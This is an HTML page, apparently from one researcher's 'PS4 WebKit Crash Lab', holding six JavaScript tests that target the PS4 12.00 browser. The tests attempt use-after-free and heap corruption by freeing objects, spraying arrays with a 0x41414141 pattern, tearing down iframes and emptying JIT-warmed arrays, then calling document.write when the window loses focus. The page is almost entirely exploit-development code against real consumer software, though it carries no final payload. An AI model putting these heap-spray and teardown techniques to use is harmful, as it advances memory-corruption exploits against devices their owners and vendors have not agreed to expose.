<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit Crash Lab - Leandro</title>
</head>
<body>

    <h1>PS4 12.00 - Full Screen & Teardown Tests</h1>
    <p>Instructions: Click a button, wait for Full Screen, then press <b>OPTIONS</b>.</p>

    <button onclick="test1()">1. Basic UAF Teardown</button>
    
    <hr>

    <button onclick="test2()">2. Massive Spray + Write</button>

    <hr>

    <button onclick="test3()">3. Iframe Teardown</button>

    <hr>

    <button onclick="test4()">4. Circular Object Crash</button>

    <hr>

    <button onclick="test5()">5. Multi-Object Corruption</button>

    <hr>

    <button onclick="test6()">6. JIT Array Stress</button>

    <script>
    const PATTERN = 2.121995791e-314; // 0x4141414141414141

    // Função auxiliar para garantir o Full Screen
    function goFS() {
        const el = document.documentElement;
        if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
    }

    // 1. UAF BÁSICO: Deleta o objeto e sobrescreve no blur
    function test1() {
        let victim = new Float64Array(100).fill(1.1);
        goFS();
        window.onblur = function() {
            victim = null; 
            let spray = new Float64Array(1000).fill(PATTERN);
            document.write("<h1>CRASHING...</h1>");
        };
    }

    // 2. SPRAY MASSIVO: Tenta ocupar o máximo de memória antes do write
    function test2() {
        goFS();
        window.onblur = function() {
            let storage = [];
            for(let i = 0; i < 10000; i++) {
                storage.push(new Float64Array(32).fill(PATTERN));
            }
            document.write("<h1>CRASHING...</h1>");
        };
    }

    // 3. IFRAME ISOLATION: O que você sugeriu, focado no teardown do frame
    function test3() {
        const ifrm = document.createElement('iframe');
        document.body.appendChild(ifrm);
        ifrm.contentWindow.victim = new Float64Array(50).fill(1.1);
        
        goFS();
        window.onblur = function() {
            ifrm.remove(); // Destrói o contexto do iframe
            document.write("<h1>CRASHING...</h1>");
        };
    }

    // 4. CIRCULAR REFERENCE: Cria um loop que o document.write terá dificuldade em limpar
    function test4() {
        let a = { };
        let b = { next: a };
        a.next = b; 
        
        goFS();
        window.onblur = function() {
            a = null;
            b = null;
            document.write("<h1>CRASHING...</h1>");
        };
    }

    // 5. MULTI-OBJECT CORRUPTION: Mistura strings e arrays para confundir o Heap
    function test5() {
        let targets = [];
        for(let i=0; i<100; i++) targets.push(new AudioContext());
        
        goFS();
        window.onblur = function() {
            targets = null;
            document.write("<h1>CRASHING...</h1>");
        };
    }

    // 6. JIT Array Stress: Força o compilador JIT e interrompe com write
    function test6() {
        let arr = [1.1, 2.2, 3.3];
        // "Esquenta" o array
        for(let i=0; i<10000; i++) arr.push(i + 0.1);
        
        goFS();
        window.onblur = function() {
            arr.length = 0; // Esvazia o array bruscamente
            document.write("<h1>CRASHING...</h1>");
        };
    }
    </script>

</body>
</html>
